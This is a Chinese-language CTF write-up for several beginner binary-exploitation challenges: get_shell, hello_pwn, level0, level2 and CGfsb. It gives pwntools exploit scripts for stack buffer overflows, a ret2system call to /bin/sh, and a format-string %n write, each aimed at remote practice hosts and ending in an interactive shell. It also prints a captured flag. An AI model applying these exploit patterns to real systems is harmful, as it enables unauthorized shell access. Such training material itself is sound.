# get_shell

文件信息

![输入图片说明](image/5749f31a96314d1d89ac37465529ff91.png)

![输入图片说明](image/b7a905def8144d1fb0a4acb3516f89d7.png)

flag

```csharp
helloctfos@Hello-CTF:~$ nc 61.147.171.105 56505
ls
bin
dev
flag
get_shell
lib
lib32
lib64
cat flag
cyberpeace{be73b6d2c6ef9335f302372399629769}
```

# hello_pwn

文件信息

![输入图片说明](image/1d8aad0b430e4796ae8122e80d23b61e.png)

![输入图片说明](image/a42e9a985ee747ecbcb96318dfdaff1e.png)

sub_400686

![输入图片说明](image/3a068e1e5dbe43408151673752f49182.png)

```csharp
from pwn import *
p=remote('61.147.171.105','50394')
p.recvuntil("lets get helloworld for bof")
payload=('a'*0x4).encode()+p64(1853186401)
p.sendline(payload)#将payload发送给程序
p.interactive()#进入交互界面8、执行exp，成功拿到攻防世界的flag
```

# level0

文件信息

![输入图片说明](image/52374d9549c54312ac4156a220153f52.png)

![输入图片说明](image/ca55a151892d493482fa8c829369ea83.png)

![输入图片说明](image/c766376250dc4ee98c082cbeda3d1701.png)

找到了我们需要返回的地方

![输入图片说明](image/06e7b3c9d2f94f3da0273e653e0deb22.png)

生成一段字符串，看一下大小

![输入图片说明](image/3fa295e89ba94de798ad49a9fec77183.png)

![输入图片说明](image/74cf039c5ced47ee8860d20ec5ad1a22.png)

查找一下callsystem函数地址

![输入图片说明](image/8d24232499b140e5babc6063132deb92.png)

payload

```csharp
from pwn import*

r=remote("61.147.171.105",52218)

payload=b"a"*136+p64(0x400596)

r.sendline(payload)
r.interactive()
```

# level2

文件信息

![输入图片说明](image/f252dc3fd0084d87a095fd445a74fff3.png)

buf0x88大小

![输入图片说明](image/f236069e82fa41eaae589334b76d02a9.png)

system

![输入图片说明](image/3d21b5db265c47e5af3bbdf1604104de.png)

/bin/sh

![输入图片说明](image/1cc5862d5dda463aa1f69566fea44065.png)

payload

```csharp
from pwn import*

r=remote("61.147.171.105",54081)

systemaddr=0x08048320
binshaddr=0x0804A024
payload=b"a"*0x88+b"a"*4+p32(systemaddr)+b"a"*4+p32(binshaddr)

r.sendline(payload)
r.interactive()
```

# CGfsb

文件信息

![输入图片说明](image/f680a8b228c84ebb84664e5f2991fdc9.png)

pwnme在0804A068

![输入图片说明](image/c1d862f216aa45b2b337516c2097ab6e.png)

存在格式化字符串

![输入图片说明](image/f5589e1d9a29468b8c96e075f6c2432c.png)

确定偏移量为10

![输入图片说明](image/0fe5d190197741f9b63e34330b09d563.png)

payload

```csharp
from pwn import*

p=remote("61.147.171.105",55602)


pwnme=0x0804A068
p.recvuntil("please tell me your name:\n")
p.sendline('a')
payload = p32(pwnme)+b'a'*0x4 +b'%10$n'
p.recvuntil("leave your message please:\n")

p.sendline(payload)
p.interactive()
```
